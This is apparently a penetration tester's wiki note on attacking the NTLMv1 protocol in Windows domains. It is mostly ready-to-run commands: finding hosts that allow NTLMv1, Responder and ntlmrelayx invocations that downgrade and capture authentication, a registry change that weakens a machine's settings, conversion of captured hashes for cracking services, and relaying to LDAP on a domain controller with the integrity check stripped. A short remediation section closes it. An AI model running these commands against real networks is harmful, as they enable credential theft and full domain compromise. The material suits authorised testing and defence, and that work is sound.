---
title: NTLMv1
---

NTLMv1 is the first version of the NTLM authentication protocol, the predecessor of NTLMv2 and insecure in multiple ways.

# Discovery

Search for [[notes/ad/gpo|GPOs]] that enable NTLMv1 by setting `HKLM\System\CurrentControlSet\control\LSA\LMCompatibilityLevel` to `2` or lower.

If you already have admin rights on a computer you can check this registry value trough *Remote Registry* ([source](https://github.com/Porchetta-Industries/CrackMapExec/pull/640)).

=== "[[notes/tools/crackmapexec]]"
    ~~~ bash
    crackmapexec smb 192.168.178.0/24 -u jdoe -p 'passw0rd' -M ntlmv1
    ~~~

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-reg -k -no-pass dc01.corp.local query -keyName 'HKLM\SYSTEM\CurrentControlSet\Control\Lsa' -v LMCompatibilityLevel
    ~~~

# Capture & Crack

[[notes/ad/ntlm-relay-source|Coerce NTLM authentication]] from your target and capture the responses.

Configure a static challenge.

~~~ bash
sudo sed -i 's/^Challenge = .*/Challenge = 1122334455667788/' /usr/share/responder/Responder.conf
~~~

Then try different downgrade techniques ([source](https://twitter.com/hackanddo/status/1420135330171207685), [source](https://twitter.com/ShitSecure/status/1599722053552066561)).

~~~ bash
sudo responder -A --disable-ess -I eth0
sudo responder -A --lm -I eth0
sudo responder -A --lm --disable-ess -I eth0
sudo impacket-ntlmrelayx -smb2support -ntlmchallenge 1122334455667788 -of ./hashes.txt
sudo impacket-ntlmrelayx -ntlmchallenge 1122334455667788 -of ./hashes.txt
~~~

Alternatively on Windows with [Inveigh](https://github.com/Kevin-Robertson/Inveigh) (untested).

~~~ powershell
reg.exe add HKLM\System\CurrentControlSet\Control\Lsa /v LMCompatibilityLevel /t REG_DWORD /d 0 /f
Invoke-Inveigh -ConsoleOutput Y -Challenge 1122334455667788
~~~

Then continue with [[notes/cryptography/hash-cracking]] to turn the NTLMv1 response into an NT hash.
NTLMv1 is based on DES and cryptographically broken, because the DES key space can be fully enumerated with FPGAs.
[crack.sh](https://crack.sh) provides a service for cracking DES.

a) NTLMv1 without SSP

[crack.sh](https://crack.sh) cracks this responses for free trough a huge rainbow table.

Responder output: `[SMB] NTLMv1 Hash : hashcat::DUSTIN:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788`  
Input for [crack.sh](https://crack.sh): `NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595`  

b) NTLMv1 with SSP/ESS

Such responses can be easily identified, because they contain a large amount of consecutive zeros.
Pass the output from Responder to [ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) to get the input for [crack.sh](https://crack.sh).
Cracking requires full brute force and is not free.

~~~ bash
python3 ./ntlmv1.py --ntlmv1 'hashcat::DUSTIN:85D5BC2CE95161CD00000000000000000000000000000000:892F905962F76D323837F613F88DE27C2BBD6C9ABCD021D0:1122334455667788'
~~~

If [crack.sh](https://crack.sh) is currently down you can crack both NTLMv1 response variants with a beefy GPU and [[notes/tools/hashcat]].
See [ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) for more details.
Responses captured from users can be looked up in a huge database with [shuck.sh](https://shuck.sh).

In any case the resulting NT hash can be used to forge a RC4 [[notes/ad/silver-ticket]], [[notes/ad/kerberos-delegate2thyself]] or perform a [[notes/ad/dcsync]] in case of a domain controller.

References:

- [twitter.com/\_EthicalChaos\_/status/1710185074061152501](https://twitter.com/_EthicalChaos_/status/1710185074061152501), cracking NTLMv1 hashes takes two days with four RTX 3080s
- [NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [Cracking NETLM/NETNTLMv1 authentication](https://crack.sh/netntlm/)
- [NetNTLMtoSilverTicket](https://github.com/notmedic/netntlmtosilverticket)

# Relay

Computers that still support NTLMv1 are a wonderful [[notes/ad/ntlm-relay-sink]], because NTLMv1 allows cross-protocol relaying from SMB to LDAP by dropping the MIC.
Additionally relay protections like SMB Signing and LDAP Signing don't apply to NTLMv1 and relaying from SMB to TLS endpoints like HTTPS and LDAPS is possible as long as EPA is not set to `required` because NTLMv1 does not support Channel Binding.

[[notes/ad/ntlm-relay-from-smb|Coerce NTLM authentication over SMB]] from a valuable computer and [[notes/ad/ntlm-relay-to-ldap|relay to LDAP]] on a domain controller.

~~~ bash
impacket-ntlmrelayx -debug --no-http-server --no-raw-server --no-wcf-server -smb2support --no-dump --no-da --no-acl --no-validate-privs --remove-mic -i -t ldap://dc01.corp.local
~~~

References:

- [NetNTLMv1 Downgrade to Compromise](http://web.archive.org/web/20230901141443/https://www.r-tec.net/r-tec-blog-netntlmv1-downgrade-to-compromise.html)
- [Practical Attacks against NTLMv1](https://web.archive.org/web/20220916075004/https://www.trustedsec.com/blog/practical-attacks-against-ntlmv1/)
- [Relaying 101: NTLM Downgrade Attack](http://web.archive.org/web/20220822082322/https://luemmelsec.github.io/Relaying-101/#ntlm-downgrade-attack)
- [NTLMv1 vs NTLMv2: Digging into an NTLM downgrade attack](http://web.archive.org/web/20221122220544/https://www.praetorian.com/blog/ntlmv1-vs-ntlmv2/)

# Remediation

1. Analyze event 4624 on DCs to find applications that fall back to NTLMv1.
2. Disable NTLMv1 by setting the registry value `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\LMCompatibilityLevel` to `3` or higher.

References:

- [Audit use of NTLMv1 on a domain controller](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/audit-domain-controller-ntlmv1)
